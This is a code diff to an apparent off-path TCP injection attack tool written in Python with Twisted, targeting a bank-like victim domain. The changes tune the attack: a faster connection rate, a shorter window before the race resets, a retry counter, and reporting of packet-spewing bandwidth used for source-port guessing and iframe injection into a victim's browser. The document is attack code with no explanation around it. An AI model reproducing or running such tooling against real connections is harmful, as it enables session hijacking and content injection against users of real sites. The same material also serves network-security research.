@@ -96,7 +96,7 @@ VICTIM_DOMAIN = 'bank.hobocomp.com'
 #VICTIM_DOMAIN='putlocker.com'
 
 
-NEW_CONNECTION_PERIOD = 0.01
+NEW_CONNECTION_PERIOD = 0.005
 CONNECTION_TIMEOUT = 30.0
 SPEW_DELAY_US = '100'
 SPEW_TIME_MS  = '500'   # if you don't win the race in the first few seconds, you're not going to
@@ -196,7 +196,7 @@ class ControlWebSocket(Protocol):
         self.transport.write('iframe')
         if (self.spewer_pid == None):
             self.spawnHTTPSpewer() 
-        if (time.time() - self.last_init_iframe) < 20:
+        if (time.time() - self.last_init_iframe) < 15:
             reactor.callLater(float(self.RTT*2.5)/1000, self.make_iframe)
         else:
             # reset the whole thing, try again
@@ -205,6 +205,8 @@ class ControlWebSocket(Protocol):
             self.state = STATE_SOURCE_PORT_GUESS
             self.seq_spew_port = None
             self.killSpewer()
+            self.num_tries += 1
+            self.transport.write("tries %d" % self.num_tries)
 
             reactor.callLater(1, self.fireAgain)
 
@@ -474,6 +476,9 @@ class ControlWebSocket(Protocol):
         pps /= 2 # have to send both SYN and RST
 
 
+        self.transport.write('bwres <b>%f mbps<br/>~= %f kpkts/sec<br/>~= %s us packet delay</b>' % \
+            ((bw/float(1024*1024)), (pps/float(1000)), self.SPEW_DELAY_US))
+
         port_guesses = float(pps * self.RTT) / 1000.0   # number of ports we can guess per RTT
 
         port_guesses *= 0.8  # fudge factor
@@ -513,6 +518,7 @@ class ControlWebSocket(Protocol):
     def connectionMade(self):
         self.bucket_search = True
         self.bucket = 0
+        self.num_tries = 0
         
         # Tell that browser to open a connection to get rid of the "Chrome opens 5-50 connections
         # for whatever reason when first asked, then calms down and only opens 1
